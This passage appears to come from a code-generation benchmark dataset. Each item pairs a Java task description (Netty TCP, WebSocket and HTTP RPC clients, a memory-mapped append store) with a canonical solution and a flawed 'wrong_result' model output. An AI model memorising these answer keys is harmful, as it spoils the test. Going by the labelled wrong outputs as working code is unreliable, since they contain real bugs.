    "wrong_result": "public class JacksonClient {\n    private final String host;\n    private final int port;\n\n    public JacksonClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ch.pipeline().addLast(new ClientHandler());\n                         }\n                     });\n\n            ChannelFuture future = bootstrap.connect(new InetSocketAddress(host, port)).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class ClientHandler extends SimpleChannelInboundHandler<String> {\n        private final JacksonBean bean;\n\n        public ClientHandler() {\n            this.bean = new JacksonBean();\n        }\n\n        @Override\n        protected void channelActive(ChannelHandlerContext ctx) {\n            try {\n                String json = new ObjectMapper().writeValueAsString(bean);\n                ctx.writeAndFlush(json);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    private static class JacksonBean {\n        private List<String> list = Arrays.asList(\"item1\", \"item2\");\n        private Map<String, Object> map = new HashMap<>();\n        private String name = \"Sample\";\n    }\n}"
  },
  {
    "Task_id": 133,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a non-blocking connection to a remote server, send serialized objects, and handle graceful shutdown.\n\nClass Description: SerializationClient is a Netty-based TCP client that connects to a specified host and port, sends multiple instances of a serializable object (SerializationBean) to the server, and manages connection lifecycle including proper resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- Constructor: SerializationClient(String host, int port) -> None - Initializes the client with target server's host and port\n- run: void() throws Exception - Main method that:\n  1. Initializes Netty client components\n  2. Establishes TCP connection\n  3. Sends multiple serialized objects\n  4. Manages connection lifecycle and cleanup\n  5. Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class SerializationClient {\n\n    private final String host;\n    private final int port;\n\n    public SerializationClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new SerializationClientInitializer());\n\n            Channel channel = bootstrap.connect(host, port).sync().channel();\n\n            SerializationBean user = new SerializationBean();\n\n            for (int i = 0; i < 10; i++) {\n                user = new SerializationBean();\n                user.setAge(i);\n                user.setName(\"waylau\");\n                channel.write(user);\n            }\n            channel.flush();\n\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class SerializationClient {\n    private String host;\n    private int port;\n\n    public SerializationClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ClientHandler());\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n\n            List<SerializationBean> beans = generateBeans();\n            for (SerializationBean bean : beans) {\n                byte[] data = serialize(bean);\n                future.channel().writeAndFlush(Unpooled.copiedBuffer(data)).sync();\n            }\n\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private byte[] serialize(SerializationBean bean) throws IOException {\n        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(bos);\n        oos.writeObject(bean);\n        oos.close();\n        return bos.toByteArray();\n    }\n\n    private List<SerializationBean> generateBeans() {\n        List<SerializationBean> beans = new ArrayList<>();\n        beans.add(new SerializationBean(\"value1\"));\n        beans.add(new SerializationBean(\"value2\"));\n        return beans;\n    }\n\n    private class ClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            // Optional: handle connection active\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            // Handle incoming messages if needed\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static class SerializationBean implements Serializable {\n        private String value;\n\n        public SerializationBean(String value) {\n            this.value = value;\n        }\n\n        public String getValue() {\n            return value;\n        }\n\n        public void setValue(String value) {\n            this.value = value;\n        }\n    }\n}"
  },
  {
    "Task_id": 137,
    "Instruction": "Task Description: Implement a TCP client using Java Netty framework that can maintain persistent connections to multiple hosts and send messages to them.\n\nClass Description: This class provides functionality to initialize and manage Netty TCP client connections to multiple hosts. It maintains a connection pool using maps to store active channels and their associated event loop groups.\n\nAttributes:\n- channelMap: Map<String, Channel> - Stores active channels mapped by host address\n- groupMap: Map<String, NioEventLoopGroup> - Stores event loop groups mapped by host address\n\nMethods:\n- initSocketClientAndSendMessage(String host, String message) -> Channel - Initializes a new TCP client connection to the specified host if one doesn't exist, or reuses an existing connection. Sends the provided message to the host. Returns the Channel object for the connection.\n  - Input Parameters:\n    - host: String - The host address to connect to\n    - message: String - The message to be sent to the host\n  - Return Type: Channel - The Netty Channel object representing the connection",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.bytes.ByteArrayEncoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.Charset;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic static Map<String, Channel> channelMap;\npublic static Map<String, NioEventLoopGroup> groupMap;\n\n@Override\npublic Channel initSocketClientAndSendMessage(String host, String message) throws Exception {\n    if(channelMap==null){\n        channelMap = new HashMap<>();\n    }\n    if(groupMap==null){\n        groupMap = new HashMap<>();\n    }\n\n    if(channelMap.get(host)==null){\n        NioEventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(new InetSocketAddress(host, 9003))\n                .handler(new ChannelInitializer() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        ch.pipeline().addLast(new StringEncoder(Charset.forName(\"GBK\")));\n                        ch.pipeline().addLast(new ByteArrayEncoder());\n                        ch.pipeline().addLast(new ChunkedWriteHandler());\n                    }\n                });\n            ChannelFuture cf = b.connect();\n            channelMap.put(host, cf.channel());\n            groupMap.put(host, group);\n            return null;\n        } catch (Exception e){\n            group.shutdownGracefully().sync();\n            return null;\n        }\n    }else{\n        channelMap.get(host).writeAndFlush(StringTools.hexStringToBytes(message));\n        return channelMap.get(host);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 3,
    "wrong_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.buffer.Unpooled;\nimport io.netty.util.CharsetUtil;\nimport java.net.InetSocketAddress;\nimport java.util.Map;\nimport java.util.HashMap;\n\npublic class TcpClientManager {\n    private final Map<String, Channel> channelMap = new HashMap<>();\n    private final Map<String, EventLoopGroup> groupMap = new HashMap<>();\n\n    public Channel initSocketClientAndSendMessage(String host, String message) {\n        Channel channel = channelMap.get(host);\n        if (channel == null || !channel.isActive()) {\n            EventLoopGroup group = groupMap.get(host);\n            if (group == null) {\n                group = new NioEventLoopGroup();\n                groupMap.put(host, group);\n            }\n\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            // No handler needed for sending message\n                        }\n                    });\n\n            try {\n                ChannelFuture future = bootstrap.connect(new InetSocketAddress(host, 8080)).sync();\n                channel = future.channel();\n                channelMap.put(host, channel);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n\n        ByteBuf buf = Unpooled.copiedBuffer(message, CharsetUtil.UTF_8);\n        channel.writeAndFlush(buf).addListener(future -> {\n            if (future.isSuccess()) {\n                System.out.println(\"Message sent to \" + host);\n            } else {\n                System.out.println(\"Failed to send message to \" + host);\n            }\n        });\n\n        return channel;\n    }\n}"
  },
  {
    "Task_id": 139,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket client proxy using Netty framework to establish and manage WebSocket connections to a remote server.\n\nClass Description: The WebsocketProxy class implements the Proxy interface and provides functionality to connect to a WebSocket server using Netty's non-blocking I/O. It handles WebSocket protocol negotiation, connection management, and graceful shutdown of resources.\n\nAttributes: (This class doesn't have any explicit attributes as it's primarily focused on connection management)\n\nMethods:\n1: connect(String serverAddress, int port) -> void - Establishes a WebSocket connection to the specified server address and port. The method:\n   - Creates a WebSocket URI using the provided address and port\n   - Initializes Netty's event loop group and bootstrap\n   - Configures the channel pipeline with necessary handlers (idle state, HTTP codec, WebSocket protocol)\n   - Connects to the server and waits for the connection to close\n   - Ensures proper resource cleanup on shutdown\n   Throws InterruptedException if the connection is interrupted and URISyntaxException if the URI is malformed\n\nInput:\n- serverAddress: String - The IP address or hostname of the WebSocket server\n- port: int - The port number on which the WebSocket server is listening\n\nOutput: None (void) - The method establishes a persistent connection that remains open until closed by either end",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.websocketx.*;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.client.handler.WebsocketTransferHandler;\nimport org.nico.ratel.landlords.print.SimplePrinter;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.concurrent.TimeUnit;\n\npublic class WebsocketProxy implements Proxy {\n\n    @Override\n    public void connect(String serverAddress, int port) throws InterruptedException, URISyntaxException {\n        URI uri = new URI(\"ws://\" + serverAddress + \":\" + port + \"/ratel\");\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                    .addLast(new IdleStateHandler(60 * 30, 0, 0, TimeUnit.SECONDS))\n                                    .addLast(new HttpClientCodec())\n                                    .addLast(new HttpObjectAggregator(8192))\n                                    .addLast(new WebSocketClientProtocolHandler(uri\n                                            , WebSocketVersion.V13\n                                            , null\n                                            , true\n                                            , new DefaultHttpHeaders(), 100000))\n                                    .addLast(\"ws\", new WebsocketTransferHandler());\n                        }\n                    });\n            SimplePrinter.printNotice(\"Connecting to \" + serverAddress + \":\" + port);\n            Channel channel = bootstrap.connect(serverAddress, port).sync().channel();\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class WebsocketProxy {\n    public void connect(String serverAddress, int port) throws URISyntaxException, InterruptedException {\n        if (serverAddress == null || serverAddress.isEmpty()) {\n            throw new URISyntaxException(null, \"Invalid server address\");\n        }\n        if (port <= 0 || port > 65535) {\n            throw new URISyntaxException(null, \"Invalid port number\");\n        }\n\n        String uri = \"ws://\" + serverAddress + \":\" + port;\n        URI parsedUri = new URI(uri);\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(bossGroup, workerGroup);\n            bootstrap.channel(NioSocketChannel.class);\n            bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new HttpObjectAggregator(8192));\n                    p.addLast(new HttpClientCodec());\n                    p.addLast(new WebSocketClientHandler());\n                }\n            });\n\n            ChannelFuture future = bootstrap.connect(parsedUri.getHost(), parsedUri.getPort()).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private class WebSocketClientHandler extends SimpleChannelInboundHandler<TextMessage> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, TextMessage msg) throws Exception {\n            // Handle incoming messages\n        }\n    }\n}"
  },
  {
    "Task_id": 14,
    "Instruction": "Task Description: Implement a class that provides memory-mapped file operations for efficient random read access while supporting sequential write operations. The class should manage file segments, handle resource cleanup, and provide disk usage information.\n\nClass Description: AppendStoreMmap is an abstract class that implements memory-mapped file operations for large files divided into segments. It combines sequential writing with random reading capabilities using memory mapping for efficient access. The class handles file channel management, segment mapping, and resource cleanup.\n\nAttributes:\n- outputStream: DataOutputStream - Used for sequential writing operations\n- segmentBits: int - Number of bits representing segment size (log2 of segment size)\n- segmentMask: long - Bitmask for segment calculations\n- segmentBytes: long - Size of each segment in bytes\n- path: Path - File path being operated on\n- madvise: boolean - Whether to use memory advice for mapped buffers\n- outIdx: long - Current output index position\n- segments: MappedByteBuffer[] - Array of mapped byte buffers for file segments\n- channel: FileChannel - File channel for memory mapping operations\n- LOGGER: Logger - Logger instance for error reporting\n\nMethods:\n- AppendStoreMmap(Path path, boolean madvise) -> None - Constructor with default segment size (1GB)\n- AppendStoreMmap(Path path, long segmentSizeBytes, boolean madvise) -> None - Constructor with custom segment size\n- getSegments() -> MappedByteBuffer[] - Returns mapped segments, initializing them if needed\n- close() -> None - Closes all resources and unmaps segments\n- diskUsageBytes() -> long - Returns current disk usage of the file",
    "Canonical_solution": "import java.io.BufferedOutputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Arrays;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nabstract class AppendStoreMmap implements AppendStore {\n\n  private static final Logger LOGGER = LoggerFactory.getLogger(AppendStoreMmap.class);\n\n  final DataOutputStream outputStream;\n  final int segmentBits;\n  final long segmentMask;\n  final long segmentBytes;\n  private final Path path;\n  private final boolean madvise;\n  long outIdx = 0;\n  private volatile MappedByteBuffer[] segments;\n  private volatile FileChannel channel;\n\n  AppendStoreMmap(Path path, boolean madvise) {\n    this(path, 1 << 30, madvise);\n  }\n\n  AppendStoreMmap(Path path, long segmentSizeBytes, boolean madvise) {\n    this.path = path;\n    this.madvise = madvise;\n    segmentBits = (int) (Math.log(segmentSizeBytes) / Math.log(2));\n    segmentMask = (1L << segmentBits) - 1;\n    segmentBytes = segmentSizeBytes;\n    try {\n      this.outputStream = new DataOutputStream(new BufferedOutputStream(Files.newOutputStream(path), 50_000));\n    } catch (IOException e) {\n      throw new IllegalStateException(\"Could not create SequentialWriteRandomReadFile output stream\", e);\n    }\n  }\n\n  MappedByteBuffer[] getSegments() {\n    if (segments == null) {\n      synchronized (this) {\n        if (segments == null) {\n          try {\n            outputStream.close();\n            channel = FileChannel.open(path, StandardOpenOption.READ);\n            segments = ByteBufferUtil.mapFile(channel, outIdx, segmentBytes, madvise);\n          } catch (IOException e) {\n            throw new UncheckedIOException(e);\n          }\n        }\n      }\n    }\n    return segments;\n  }\n\n  @Override\n  public void close() throws IOException {\n    outputStream.close();\n    synchronized (this) {\n      if (channel != null) {\n        channel.close();\n      }\n      if (segments != null) {\n        try {\n          ByteBufferUtil.free(segments);\n        } catch (IOException e) {\n          LOGGER.info(\"Unable to unmap {} {}\", path, e);\n        }\n        Arrays.fill(segments, null);\n      }\n    }\n  }\n\n  @Override\n  public long diskUsageBytes() {\n    return FileUtils.size(path);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public abstract class AppendStoreMmap {\n    private final Path path;\n    private final long segmentSizeBytes;\n    private final int segmentBits;\n    private final long segmentMask;\n    private final boolean madvise;\n    private long outIdx;\n    private MappedByteBuffer[] segments;\n    private FileChannel channel;\n    private final Logger LOGGER = Logger.getLogger(AppendStoreMmap.class.getName());\n    private final DataOutputStream outputStream;\n\n    public AppendStoreMmap(Path path, boolean madvise) {\n        this(path, 1024 * 1024 * 1024, madvise);\n    }\n\n    public AppendStoreMmap(Path path, long segmentSizeBytes, boolean madvise) {\n        this.path = path;\n        this.segmentSizeBytes = segmentSizeBytes;\n        this.segmentBits = (int) (Math.log(segmentSizeBytes) / Math.log(2));\n        this.segmentMask = (1L << segmentBits) - 1;\n        this.madvise = madvise;\n        try {\n            this.channel = FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n            this.outputStream = new DataOutputStream(channel);\n            this.segments = new MappedByteBuffer[1];\n            this.segments[0] = channel.map(FileChannel.MapMode.READ_WRITE, 0, segmentSizeBytes);\n            this.outIdx = 0;\n        } catch (IOException e) {\n            LOGGER.severe(\"Error initializing AppendStoreMmap: \" + e.getMessage());\n        }\n    }\n\n    public MappedByteBuffer[] getSegments() {\n        long currentTotalSize = segments.length * segmentSizeBytes;\n        if (outIdx > currentTotalSize) {\n            int neededSegments = (int) ((outIdx + segmentSizeBytes - 1) / segmentSizeBytes);\n            MappedByteBuffer[] newSegments = new MappedByteBuffer[neededSegments];\n            System.arraycopy(segments, 0, newSegments, 0, segments.length);\n            this.segments = newSegments;\n            for (int i = segments.length; i < neededSegments; i++) {\n                long position = i * segmentSizeBytes;\n                segments[i] = channel.map(FileChannel.MapMode.READ_WRITE, position, segmentSizeBytes);\n            }\n        }\n        return segments;\n    }\n\n    public void close() {\n        if (channel != null) {\n            try {\n                channel.close();\n            } catch (IOException e) {\n                LOGGER.severe(\"Error closing channel: \" + e.getMessage());\n            }\n        }\n    }\n\n    public long diskUsageBytes() {\n        try {\n            return channel.size();\n        } catch (IOException e) {\n            LOGGER.severe(\"Error getting disk usage: \" + e.getMessage());\n            return 0;\n        }\n    }\n}"
  },
  {
    "Task_id": 140,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based HTTP client for RPC communication, capable of establishing and managing TCP connections, sending requests, and handling responses.\n\nClass Description: NettyHttpConnectClient is a connection client implementation that uses Netty framework to establish HTTP connections with a remote server. It handles connection lifecycle, request sending, and connection validation.\n\nAttributes:\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - Represents the active network channel\n- serializer: [Serializer] - Handles request/response serialization\n- address: [String] - The server address including protocol and port\n- host: [String] - The server hostname extracted from address\n\nMethods:\n- init: [init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory)] -> [void] - Initializes the client with server address, serializer and invoker factory. Creates Netty bootstrap and establishes connection.\n- isValidate: [isValidate()] -> [boolean] - Checks if the current connection is active and valid.\n- close: [close()] -> [void] - Closes the active connection and releases resources.\n- send: [send(XxlRpcRequest xxlRpcRequest)] -> [void] - Serializes and sends an RPC request to the server through the established channel.",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.invoker.XxlRpcInvokerFactory;\nimport com.wugui.datax.rpc.remoting.net.common.ConnectClient;\nimport com.wugui.datax.rpc.remoting.net.common.NettyConstant;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.serialize.Serializer;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttpConnectClient extends ConnectClient {\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private Serializer serializer;\n    private String address;\n    private String host;\n\n    @Override\n    public void init(String address, final Serializer serializer, final XxlRpcInvokerFactory xxlRpcInvokerFactory) throws Exception {\n        final NettyHttpConnectClient thisClient = this;\n\n        if (!address.toLowerCase().startsWith(\"http\")) {\n            address = \"http://\" + address;\n        }\n\n        this.address = address;\n        URL url = new URL(address);\n        this.host = url.getHost();\n        int port = url.getPort() > -1 ? url.getPort() : 80;\n\n        this.group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel channel) throws Exception {\n                        channel.pipeline()\n                                .addLast(new IdleStateHandler(0, 0, Beat.BEAT_INTERVAL, TimeUnit.SECONDS))\n                                .addLast(new HttpClientCodec())\n                                .addLast(new HttpObjectAggregator(NettyConstant.MAX_LENGTH))\n                                .addLast(new NettyHttpClientHandler(xxlRpcInvokerFactory, serializer, thisClient));\n                    }\n                })\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000);\n        this.channel = bootstrap.connect(host, port).sync().channel();\n\n        this.serializer = serializer;\n\n        if (!isValidate()) {\n            close();\n            return;\n        }\n    }\n\n    @Override\n    public boolean isValidate() {\n        if (this.channel != null) {\n            return this.channel.isActive();\n        }\n        return false;\n    }\n\n    @Override\n    public void close() {\n        if (this.channel != null && this.channel.isActive()) {\n            this.channel.close();\n        }\n        if (this.group != null && !this.group.isShutdown()) {\n            this.group.shutdownGracefully();\n        }\n    }\n\n    @Override\n    public void send(XxlRpcRequest xxlRpcRequest) throws Exception {\n        byte[] requestBytes = serializer.serialize(xxlRpcRequest);\n\n        DefaultFullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, new URI(address).getRawPath(), Unpooled.wrappedBuffer(requestBytes));\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);\n        request.headers().set(HttpHeaderNames.CONTENT_LENGTH, request.content().readableBytes());\n\n        this.channel.writeAndFlush(request).sync();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyHttpConnectClient {\n    private EventLoopGroup group;\n    private Channel channel;\n    private Serializer serializer;\n    private String address;\n    private String host;\n\n    public void init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory) {\n        this.address = address;\n        this.serializer = serializer;\n        this.host = extractHost(address);\n        int port = extractPort(address);\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group);\n            bootstrap.channel(NioSocketChannel.class);\n            bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(new HttpClientCodec());\n                    pipeline.addLast(new HttpObjectAggregator(65535));\n                    pipeline.addLast(new SimpleChannelInboundHandler<FullHttpResponse>() {\n                        @Override\n                        protected void channelRead0(ChannelHandlerContext ctx, FullHttpResponse response) {\n                            // Handle response if needed\n                        }\n                    });\n                }\n            });\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            channel = future.channel();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String extractHost(String address) {\n        try {\n            URL url = new URL(address);\n            return url.getHost();\n        } catch (MalformedURLException e) {\n            return address;\n        }\n    }\n\n    private int extractPort(String address) {\n        try {\n            URL url = new URL(address);\n            return url.getPort();\n        } catch (MalformedURLException e) {\n            return 80;\n        }\n    }\n\n    public boolean isValidate() {\n        return channel != null && channel.isActive() && channel.isRegistered();\n    }\n\n    public void close() {\n        if (channel != null) {\n            channel.close();\n            group.shutdownGracefully();\n        }\n    }\n\n    public void send(XxlRpcRequest request) {\n        byte[] payload = serializer.serialize(request);\n        FullHttpRequest requestMsg = new DefaultFullHttpRequest(\n            HttpVersion.HTTP_1_1, \n            HttpMethod.POST, \n            \"/rpc\"\n        );\n        requestMsg.headers().set(HttpHeaderNames.CONTENT_TYPE, \"application/json\");\n        requestMsg.headers().set(HttpHeaderNames.CONTENT_LENGTH, payload.length);\n        requestMsg.content().writeBytes(payload);\n        channel.writeAndFlush(requestMsg);\n    }\n}"
  },
  {
    "Task_id": 141,
    "Instruction": "Task Description: Create a Java class that manages TCP client connections using Netty framework, handling connection establishment, maintenance, and graceful shutdown.\n\nClass Description: HttpEventChannelManager is a Netty-based TCP client manager that creates and maintains connections to remote servers, provides connection metrics, and handles resource cleanup.\n\nAttributes:\n- LOG: [Logger] - Logger instance for logging debug and error messages\n- connectionSuccess: [Counter] - Metric counter for successful connections\n- connectionFailure: [Counter] - Metric counter for failed connections\n- liveConnections: [AtomicDouble] - Gauge metric for current active connections\n- nettyChannelBufferSize: [AtomicDouble] - Gauge metric for current channel buffer size\n- lowWriteBufferWatermark: [int] - Low watermark for write buffer\n- highWriteBufferWatermark: [int] - High watermark for write buffer\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for I/O operations\n- encoderEventLoopGroup: [EventLoopGroup] - Optional event loop group for compression\n- bootstrap: [Bootstrap] - Netty bootstrap for client configuration\n- channels: [ConcurrentMap<String, Channel>] - Map of active channels keyed by host:port\n\nMethods:\n- HttpEventChannelManager([Registry, MrePublishConfiguration]) -> [void] - Constructor that initializes metrics, event loops, and bootstrap configuration\n- findOrCreate([InetSocketAddress]) -> [Channel] - Finds existing or creates new channel for given address\n- find([InetSocketAddress]) -> [Channel] - Finds existing channel for given address\n- close([InetSocketAddress]) -> [void] - Closes channel for given address\n- getHostPortString([InetSocketAddress]) -> [String] - Helper method to format address as host:port string",
    "Canonical_solution": "import com.netflix.spectator.api.Counter;\nimport com.netflix.spectator.api.Registry;\nimport com.netflix.spectator.impl.AtomicDouble;\nimport io.mantisrx.publish.config.MrePublishConfiguration;\nimport io.mantisrx.publish.internal.metrics.SpectatorUtils;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.DefaultEventLoopGroup;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.WriteBufferWaterMark;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class HttpEventChannelManager {\n\n    private static final Logger LOG = LoggerFactory.getLogger(HttpEventChannel.class);\n\n    private final Counter connectionSuccess;\n    private final Counter connectionFailure;\n    private final AtomicDouble liveConnections;\n    private final AtomicDouble nettyChannelBufferSize;\n\n    private final int lowWriteBufferWatermark;\n    private final int highWriteBufferWatermark;\n\n    private final EventLoopGroup eventLoopGroup;\n    private final EventLoopGroup encoderEventLoopGroup;\n    private final Bootstrap bootstrap;\n    private final ConcurrentMap<String, Channel> channels;\n\n    public HttpEventChannelManager(\n            Registry registry,\n            MrePublishConfiguration config) {\n\n        this.connectionSuccess =\n                SpectatorUtils.buildAndRegisterCounter(\n                        registry, \"connectionSuccess\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.connectionFailure =\n                SpectatorUtils.buildAndRegisterCounter(\n                        registry, \"connectionFailure\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.liveConnections =\n                SpectatorUtils.buildAndRegisterGauge(\n                        registry, \"liveConnections\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.nettyChannelBufferSize =\n                SpectatorUtils.buildAndRegisterGauge(\n                        registry, \"bufferSize\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n\n        this.lowWriteBufferWatermark = config.getLowWriteBufferWatermark();\n        this.highWriteBufferWatermark = config.getHighWriteBufferWatermark();\n\n        this.eventLoopGroup = new NioEventLoopGroup(config.getIoThreads());\n\n        boolean gzipEnabled = config.getGzipEnabled();\n        if (gzipEnabled) {\n            this.encoderEventLoopGroup = new DefaultEventLoopGroup(config.getCompressionThreads());\n        } else {\n            this.encoderEventLoopGroup = null;\n        }\n\n  